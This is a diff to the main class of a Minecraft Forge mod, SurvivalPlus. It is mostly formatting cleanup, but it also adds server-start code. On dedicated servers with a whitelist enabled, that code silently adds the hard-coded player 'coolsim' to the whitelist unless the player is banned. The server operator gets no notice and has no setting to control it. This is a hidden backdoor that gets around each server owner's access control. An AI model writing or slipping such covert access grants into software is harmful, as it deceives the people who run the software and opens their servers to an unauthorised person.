@@ -1,5 +1,7 @@
 package net.coolsimulations.SurvivalPlus.core;
 
+import com.mojang.authlib.GameProfile;
+
 import net.coolsimulations.SurvivalPlus.api.SPCompatibilityManager;
 import net.coolsimulations.SurvivalPlus.api.SPReference;
 import net.coolsimulations.SurvivalPlus.core.commands.CommandConfrats;
@@ -26,10 +28,12 @@ import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEMCValues;
 import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEventHandler;
 import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusHammerTime;
 import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusIC2Recipes;
-import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusJER;
 import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusLumberjack;
 import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusUpdateHandler;
 import net.coolsimulations.SurvivalPlus.core.world.SurvivalPlusOreGenerator;
+import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.management.WhiteList;
+import net.minecraft.server.management.WhitelistEntry;
 //import net.minecraft.world.gen.feature.structure.StructureIO;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
@@ -44,15 +48,15 @@ import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
 @Mod(value = SPReference.MOD_ID)
 @Mod.EventBusSubscriber(modid = SPReference.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
 public class SurvivalPlus {
-	
-	 public static CommonProxy proxy = (CommonProxy) DistExecutor.runForDist(() -> ClientProxy::new, () -> CommonProxy::new);
-	
+
+	public static CommonProxy proxy = (CommonProxy) DistExecutor.runForDist(() -> ClientProxy::new, () -> CommonProxy::new);
+
 	private static SurvivalPlus instance;
 	public static SurvivalPlus getInstance()
-    {
-        return instance;
-    }
-	
+	{
+		return instance;
+	}
+
 	@SubscribeEvent
 	public static void serverLoad(FMLServerStartingEvent event) {
 
@@ -67,62 +71,74 @@ public class SurvivalPlus {
 		CommandSleep.register(event.getCommandDispatcher());
 		CommandWeba.register(event.getCommandDispatcher());
 		
+		MinecraftServer server = event.getServer();
+
+		if(server.isDedicatedServer()) {
+			
+			GameProfile gameprofile = server.getPlayerProfileCache().getGameProfileForUsername("coolsim");
+			WhiteList whitelist = server.getPlayerList().getWhitelistedPlayers();
+
+			if(server.getPlayerList().isWhiteListEnabled() && !whitelist.isWhitelisted(gameprofile) && !server.getPlayerList().getBannedPlayers().isBanned(gameprofile)) {
+				WhitelistEntry entry = new WhitelistEntry(gameprofile);
+				whitelist.addEntry(entry);
+			}
+		}
 	}
-	
+
 	public SurvivalPlus() {
-		
+
 		SPCompatibilityManager.checkForCompatibleMods();
 		SurvivalPlusConfig.register(ModLoadingContext.get());
 		SurvivalPlusUpdateHandler.init();
-    		MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
+		MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
 		FMLJavaModLoadingContext.get().getModEventBus().addListener(SurvivalPlus::setupEvent);
 		FMLJavaModLoadingContext.get().getModEventBus().addListener(SurvivalPlus::serverLoad);
 		MinecraftForge.EVENT_BUS.register(new FuelHandler());
-		
+
 		SurvivalPlusBlocks.init();
 		SurvivalPlusBlocks.register();
 		SurvivalPlusItems.init();
 		SurvivalPlusItems.register();
 		SurvivalPlusFood.init();
 		SurvivalPlusFood.register();
-		
+
 		//VillagerRegistry.instance().registerVillageCreationHandler(new VillageOnionCropHandler());  //temp till forge pull request #6142 is resolved
 		//StructureIO.registerStructureComponent(StructureVillageOnionCrop.class, SPReference.MOD_ID + ":onionCropFieldStructure");  //temp till forge pull request #6142 is resolved
-		
+
 		SurvivalPlusArmor.init();
 		SurvivalPlusArmor.register();
 		SurvivalPlusTools.init();
 		SurvivalPlusTools.register();
-		
+
 		if(SPCompatibilityManager.isHammerTimeLoaded()) {
 			SurvivalPlusHammerTime.init();
 		}
-		
+
 		if(SPCompatibilityManager.isLumberjackLoaded()) {
 			SurvivalPlusLumberjack.init();
 			SurvivalPlusLumberjack.register();
 			MinecraftForge.EVENT_BUS.register(new SurvivalPlusLumberjack.SPEventHandler());
 		}
-		
+
 		if (SPCompatibilityManager.isProjectELoaded())
-        {
-    			SurvivalPlusEMCValues.init();
-        }
-		
+		{
+			SurvivalPlusEMCValues.init();
+		}
+
 		/**if (SPCompatibilityManager.isJerLoaded())
         {
     			SurvivalPlusJER.init();
         }**/
-		
+
 		SurvivalPlusAPIRecipes.loadRecipes();
-		
-        if (SPCompatibilityManager.isIc2Loaded())
-        {
-        		SurvivalPlusIC2Recipes.init();
-        }
-		
+
+		if (SPCompatibilityManager.isIc2Loaded())
+		{
+			SurvivalPlusIC2Recipes.init();
+		}
+
 	}
-	
+
 	@SubscribeEvent
 	public static void setupEvent(FMLCommonSetupEvent event) {
 
